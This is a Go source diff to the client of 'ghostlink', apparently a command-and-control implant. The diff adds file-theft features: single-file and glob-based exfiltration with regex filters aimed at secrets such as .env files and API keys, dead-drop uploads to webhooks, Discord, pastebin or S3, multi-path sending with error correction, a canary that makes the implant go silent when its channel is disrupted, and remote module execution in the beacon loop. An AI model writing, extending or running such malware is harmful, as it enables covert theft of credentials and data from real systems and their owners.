@@ -10,6 +10,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strings"
 	"sync/atomic"
 	"syscall"
@@ -18,7 +19,11 @@ import (
 	"github.com/byjanke/ghostlink/pkg/beacon"
 	"github.com/byjanke/ghostlink/pkg/channel"
 	"github.com/byjanke/ghostlink/pkg/crypto"
+	"github.com/byjanke/ghostlink/pkg/encoder"
+	"github.com/byjanke/ghostlink/pkg/exfil"
 	"github.com/byjanke/ghostlink/pkg/forward"
+	"github.com/byjanke/ghostlink/pkg/modules"
+	multipathpkg "github.com/byjanke/ghostlink/pkg/multipath"
 	"github.com/byjanke/ghostlink/pkg/protocol"
 	"github.com/byjanke/ghostlink/pkg/shell"
 	"github.com/byjanke/ghostlink/pkg/socks"
@@ -40,10 +45,47 @@ func main() {
 	jitterProfile := flag.String("jitter", "", "beacon jitter profile: low_slow, office, night, burst, random")
 	reconnect := flag.Bool("reconnect", false, "auto-reconnect on disconnection")
 	maxRetries := flag.Int("retries", 10, "max reconnection attempts")
+
+	exfilFile := flag.String("exfil", "", "fire-and-forget file exfiltration: path to file to exfiltrate")
+	exfilGlob := flag.String("exfil-glob", "", "glob-based file exfiltration: pattern (e.g. /var/www/**/*.env)")
+	exfilFilter := flag.String("exfil-filter", "", "content filter regex for exfil-glob (e.g. API_KEY|SECRET)")
+	exfilMaxSize := flag.Int64("exfil-max", 10485760, "max file size for exfil-glob (default 10MB)")
+
+	deadDropType := flag.String("dead-drop", "", "dead drop exfiltration: webhook, discord, pastebin, s3")
+	deadDropURL := flag.String("dead-drop-url", "", "dead drop target URL/webhook")
+	deadDropKey := flag.String("dead-drop-key", "", "dead drop API key (pastebin key or s3 access:secret)")
+	deadDropBucket := flag.String("dead-drop-bucket", "", "S3 bucket name")
+	deadDropRegion := flag.String("dead-drop-region", "us-east-1", "S3 region")
+
+	multiPath := flag.String("multi-path", "", "multi-path exfiltration: comma-separated channels")
+	multiPathFEC := flag.Bool("multi-path-fec", true, "enable FEC for multi-path exfiltration")
+
+	canary := flag.Bool("canary", false, "enable canary/tripwire mode for channel disruption detection")
+
 	flag.Parse()
 
 	if *dnsRecon {
 		runDNSRecon()
+		return
+	}
+
+	if *deadDropType != "" {
+		runDeadDropExfil(*deadDropType, *deadDropURL, *deadDropKey, *deadDropBucket, *deadDropRegion, *exfilFile, *exfilGlob, *exfilFilter, *exfilMaxSize)
+		return
+	}
+
+	if *exfilFile != "" {
+		runExfilSingle(*exfilFile, *channelType, *addr, *key, *ecdhe, *domain, *frontDomain, *hop, *canary)
+		return
+	}
+
+	if *exfilGlob != "" {
+		runExfilGlob(*exfilGlob, *exfilFilter, *exfilMaxSize, *channelType, *addr, *key, *ecdhe, *domain, *frontDomain, *hop, *canary)
+		return
+	}
+
+	if *multiPath != "" && *exfilFile != "" {
+		runMultiPathExfil(*multiPath, *exfilFile, *addr, *key, *ecdhe, *multiPathFEC)
 		return
 	}
 
@@ -62,6 +104,10 @@ func main() {
 			log.Fatal("failed to connect")
 		}
 		defer ch.Close()
+
+		if *canary {
+			startCanary(ch, *channelType, *addr, *key, *ecdhe, *frontDomain)
+		}
 
 		var cryptoSes *crypto.Session
 		if sessionKey != nil {
@@ -124,6 +170,243 @@ func main() {
 	} else {
 		connectAndRun()
 	}
+}
+
+func runExfilSingle(filePath, chType, addr, key string, ecdhe bool, domain, frontDomain, hop string, canary bool) {
+	fmt.Printf("[exfil] reading %s...\n", filePath)
+	entry, err := exfil.ReadFile(filePath)
+	if err != nil {
+		log.Fatalf("exfil: %v", err)
+	}
+	fmt.Printf("[exfil] %s — %d bytes\n", entry.Path, entry.Size)
+
+	var ch channel.Channel
+	var sessionKey []byte
+
+	if hop != "" {
+		ch, sessionKey = connectMultiChannel(hop, addr, key, ecdhe)
+	} else if domain != "" && chType == "dns" {
+		ch, sessionKey = connectAuthDNS(domain, key, ecdhe, addr)
+	} else {
+		ch, sessionKey = connectDirect(chType, addr, key, ecdhe, frontDomain)
+	}
+	if ch == nil {
+		log.Fatal("failed to connect")
+	}
+	defer ch.Close()
+
+	if canary {
+		startCanary(ch, chType, addr, key, ecdhe, frontDomain)
+	}
+
+	var cryptoSes *crypto.Session
+	if sessionKey != nil {
+		cryptoSes, _ = crypto.NewSession(sessionKey)
+	}
+
+	payload := fmt.Sprintf("%s\x00%d\x00%s", filepath.Base(entry.Path), entry.Size, string(entry.Content))
+	msg := protocol.Message{Type: protocol.MsgExfilFile, Payload: []byte(payload)}
+	sendMsg(ch, cryptoSes, msg)
+
+	resp := recvMsg(ch, cryptoSes)
+	if resp != nil && resp.Type == protocol.MsgExfilAck {
+		fmt.Printf("[exfil] server ack: %s\n", string(resp.Payload))
+	} else {
+		fmt.Println("[exfil] data sent (fire-and-forget)")
+	}
+}
+
+func runExfilGlob(pattern, filter string, maxSize int64, chType, addr, key string, ecdhe bool, domain, frontDomain, hop string, canary bool) {
+	fmt.Printf("[exfil-glob] scanning %s...\n", pattern)
+	if filter != "" {
+		fmt.Printf("[exfil-glob] filter: %s\n", filter)
+	}
+
+	files, err := exfil.GlobExfil(pattern, filter, maxSize)
+	if err != nil {
+		log.Fatalf("exfil-glob: %v", err)
+	}
+
+	if len(files) == 0 {
+		fmt.Println("[exfil-glob] no matching files")
+		return
+	}
+
+	fmt.Printf("[exfil-glob] found %d files\n", len(files))
+	for _, f := range files {
+		if f.Error != nil {
+			fmt.Printf("  [-] %s: %v\n", f.Path, f.Error)
+		} else {
+			fmt.Printf("  [+] %s — %d bytes\n", f.Path, len(f.Content))
+		}
+	}
+
+	var ch channel.Channel
+	var sessionKey []byte
+
+	if hop != "" {
+		ch, sessionKey = connectMultiChannel(hop, addr, key, ecdhe)
+	} else if domain != "" && chType == "dns" {
+		ch, sessionKey = connectAuthDNS(domain, key, ecdhe, addr)
+	} else {
+		ch, sessionKey = connectDirect(chType, addr, key, ecdhe, frontDomain)
+	}
+	if ch == nil {
+		log.Fatal("failed to connect")
+	}
+	defer ch.Close()
+
+	if canary {
+		startCanary(ch, chType, addr, key, ecdhe, frontDomain)
+	}
+
+	var cryptoSes *crypto.Session
+	if sessionKey != nil {
+		cryptoSes, _ = crypto.NewSession(sessionKey)
+	}
+
+	payload := exfil.EncodeFileList(files)
+	msg := protocol.Message{Type: protocol.MsgExfilGlob, Payload: payload}
+	sendMsg(ch, cryptoSes, msg)
+
+	resp := recvMsg(ch, cryptoSes)
+	if resp != nil && resp.Type == protocol.MsgExfilAck {
+		fmt.Printf("[exfil-glob] server ack: %s\n", string(resp.Payload))
+	} else {
+		fmt.Println("[exfil-glob] data sent (fire-and-forget)")
+	}
+}
+
+func runMultiPathExfil(channelsStr, filePath, addr, key string, ecdhe, fec bool) {
+	entry, err := exfil.ReadFile(filePath)
+	if err != nil {
+		log.Fatalf("exfil: %v", err)
+	}
+	fmt.Printf("[multi-path] %s — %d bytes\n", filePath, entry.Size)
+
+	types := strings.Split(channelsStr, ",")
+	fmt.Printf("[multi-path] channels: %v\n", types)
+
+	var dataShards, totalShards int
+	if fec {
+		dataShards, totalShards = encoder.OptimalFECParams(len(entry.Content))
+	} else {
+		dataShards = 1
+		totalShards = 1
+	}
+
+	sender := multipathpkg.NewMultipathSender(dataShards, totalShards)
+
+	for _, t := range types {
+		t = strings.TrimSpace(t)
+		ch := channel.NewChannel(channel.ChannelType(t))
+		if ch == nil {
+			fmt.Printf("[-] unknown channel: %s\n", t)
+			continue
+		}
+		cAddr := addr
+		if (t == "http" || t == "websocket" || t == "doh") && !strings.HasPrefix(cAddr, "http") {
+			cAddr = "http://" + cAddr
+		}
+		if err := ch.Connect(cAddr); err != nil {
+			fmt.Printf("[-] %s: %v\n", t, err)
+			continue
+		}
+		var ses *crypto.Session
+		if key != "" {
+			h := sha256.Sum256([]byte(key))
+			ses, _ = crypto.NewSession(h[:])
+		}
+		sender.AddPath(ch, ses)
+		fmt.Printf("[+] %s connected\n", t)
+	}
+
+	if sender.PathCount() == 0 {
+		log.Fatal("no channels could connect")
+	}
+
+	fmt.Printf("[*] %d channels, FEC %d/%d\n", sender.PathCount(), dataShards, totalShards)
+
+	if err := sender.Send(entry.Content); err != nil {
+		log.Fatalf("multi-path send: %v", err)
+	}
+
+	fmt.Println("[multi-path] exfiltration complete")
+}
+
+func runDeadDropExfil(ddType, ddURL, ddKey, ddBucket, ddRegion, exfilFile, exfilGlob, exfilFilter string, exfilMaxSize int64) {
+	cfg := channel.DeadDropConfig{
+		Type:    channel.ParseDeadDropType(ddType),
+		URL:     ddURL,
+		APIKey:  ddKey,
+		Bucket:  ddBucket,
+		Region:  ddRegion,
+		MaxSize: int(exfilMaxSize),
+	}
+
+	dd := channel.NewDeadDrop(cfg)
+
+	if exfilFile != "" {
+		fmt.Printf("[dead-drop] %s -> %s\n", exfilFile, ddType)
+		entry, err := exfil.ReadFile(exfilFile)
+		if err != nil {
+			log.Fatalf("exfil: %v", err)
+		}
+		metadata := fmt.Sprintf("%s_%d", filepath.Base(entry.Path), time.Now().Unix())
+		if err := dd.Send(entry.Content, metadata); err != nil {
+			log.Fatalf("dead-drop: %v", err)
+		}
+		fmt.Printf("[dead-drop] %d bytes sent to %s\n", entry.Size, ddType)
+		return
+	}
+
+	if exfilGlob != "" {
+		fmt.Printf("[dead-drop] %s -> %s\n", exfilGlob, ddType)
+		files, err := exfil.GlobExfil(exfilGlob, exfilFilter, exfilMaxSize)
+		if err != nil {
+			log.Fatalf("glob: %v", err)
+		}
+		for _, f := range files {
+			if f.Error != nil {
+				fmt.Printf("  [-] %s: %v\n", f.Path, f.Error)
+				continue
+			}
+			metadata := fmt.Sprintf("%s_%d", filepath.Base(f.Path), time.Now().UnixNano())
+			if err := dd.Send(f.Content, metadata); err != nil {
+				fmt.Printf("  [-] %s: %v\n", f.Path, err)
+				continue
+			}
+			fmt.Printf("  [+] %s — %d bytes\n", f.Path, len(f.Content))
+		}
+		fmt.Printf("[dead-drop] exfiltration complete\n")
+		return
+	}
+
+	log.Fatal("dead-drop requires -exfil or -exfil-glob")
+}
+
+func startCanary(ch channel.Channel, fallbackChType, addr, key string, ecdhe bool, frontDomain string) {
+	cfg := channel.CanaryConfig{
+		CheckInterval:   10 * time.Second,
+		FailureCount:    5,
+		SilenceDuration: 24 * time.Hour,
+		SelfDestruct:    false,
+		OnAlert: func(state channel.CanaryState) {
+			switch state {
+			case channel.CanaryDegrade:
+				fmt.Println("[canary] switching channel...")
+			case channel.CanarySilent:
+				fmt.Println("[canary] going silent for 24h...")
+			case channel.CanaryDead:
+				fmt.Println("[canary] channel dead")
+				os.Exit(1)
+			}
+		},
+	}
+
+	cc := channel.NewChannelCanary(cfg)
+	cc.Attach(ch)
+	cc.Start()
 }
 
 func connectMultiChannel(channels, addr, key string, ecdhe bool) (channel.Channel, []byte) {
@@ -814,6 +1097,8 @@ func runBeacon(ch channel.Channel, cryptoSes *crypto.Session, profile string) {
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
 
+	modRegistry := modules.NewRegistry()
+
 	go func() {
 		for {
 			msg := recvMsg(ch, cryptoSes)
@@ -828,6 +1113,8 @@ func runBeacon(ch channel.Channel, cryptoSes *crypto.Session, profile string) {
 				}
 				resp := protocol.Message{Type: protocol.MsgCmdRes, Payload: output}
 				sendMsg(ch, cryptoSes, resp)
+			case protocol.MsgModuleExec:
+				go handleModuleExec(ch, cryptoSes, modRegistry, *msg)
 			case protocol.MsgPong:
 				fmt.Println("[*] pong received")
 			}
@@ -874,6 +1161,26 @@ func recvMsg(ch channel.Channel, cryptoSes *crypto.Session) *protocol.Message {
 		return nil
 	}
 	return &msg
+}
+
+func handleModuleExec(ch channel.Channel, cryptoSes *crypto.Session, reg *modules.Registry, msg protocol.Message) {
+	parts := strings.Split(string(msg.Payload), "\x00")
+	modName := parts[0]
+	var modArgs []string
+	if len(parts) > 1 {
+		modArgs = parts[1:]
+	}
+
+	output, err := reg.Execute(modName, modArgs)
+	if err != nil {
+		output = []byte(fmt.Sprintf("[%s] error: %v", modName, err))
+	} else {
+		header := fmt.Sprintf("[%s]\n", modName)
+		output = append([]byte(header), output...)
+	}
+
+	resp := protocol.Message{Type: protocol.MsgModuleResult, StreamID: msg.StreamID, Payload: output}
+	sendMsg(ch, cryptoSes, resp)
 }
 
 var _ = io.Discard
